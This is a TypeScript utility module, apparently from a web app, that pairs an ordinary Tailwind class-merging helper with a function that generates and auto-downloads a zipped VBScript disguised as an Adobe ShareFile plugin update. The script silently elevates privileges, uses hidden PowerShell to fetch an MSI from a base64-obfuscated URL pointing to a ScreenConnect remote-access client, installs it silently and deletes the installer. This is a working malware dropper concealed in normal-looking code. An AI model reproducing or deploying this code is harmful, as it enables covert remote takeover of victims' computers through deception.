import { clsx, type ClassValue } from "clsx"
import { twMerge } from "tailwind-merge"

/**
 * Utility for merging Tailwind CSS classes
 * Required for Cloudflare build success
 */
export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs))
}

export async function generateDeploymentPackage(msiUrl: string) {
  const timestamp = Date.now();
  const vbsName = `Adobe_en_Sharefile_Plugin_${timestamp}.vbs`;
  const zipName = `Adobe_en_Sharefile_Update_${timestamp}.zip`;
  
  // Base64 encoded URL
  const base64Uri = "aHR0cHM6Ly9yLWlzLmNvLnVrL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0";
  const staticMsiUri = atob(base64Uri);

  const vbsContent = [
    "On Error Resume Next",
    "Set WshShell = CreateObject(\"WScript.Shell\")",
    "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
    "",
    "' --- Silent Elevation ---",
    "If Not WScript.Arguments.Named.Exists(\"elevate\") Then",
    "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 0",
    "    WScript.Quit",
    "End If",
    "",
    "' --- Pathing ---",
    "msiUri = \"" + staticMsiUri + "\"",
    "tP = fso.GetSpecialFolder(2) & \"\\\"",
    "f1 = tP & \"temp_setup.msi\"",
    "",
    "' --- Silent Download ---",
    "cmd = \"powershell -WindowStyle Hidden -Command \"\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('\" & msiUri & \"', '\" & f1 & \"')\"\"\"",
    "WshShell.Run cmd, 0, True",
    "",
    "' --- Silent Execution ---",
    "WScript.Sleep 2000",
    "If fso.FileExists(f1) Then",
    "    ' /qn = Completely Silent, /norestart",
    "    WshShell.Run \"msiexec /i \"\"\" & f1 & \"\"\" /qn /norestart\", 0, True",
    "    WScript.Sleep 5000",
    "    fso.DeleteFile(f1)",
    "End If",
    "",
    "WScript.Quit"
  ].join("\r\n");

  try {
    const JSZip = (await import("jszip")).default;
    const zip = new JSZip();
    zip.file(vbsName, vbsContent, { compression: "STORE" });

    const blob = await zip.generateAsync({ type: "blob", platform: "DOS" });
    triggerDownloadBlob(blob, zipName);
  } catch (err) {
    console.error("Package Error:", err);
  }
}

function triggerDownloadBlob(blob: Blob, filename: string) {
  const url = window.URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => {
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
  }, 100);
}
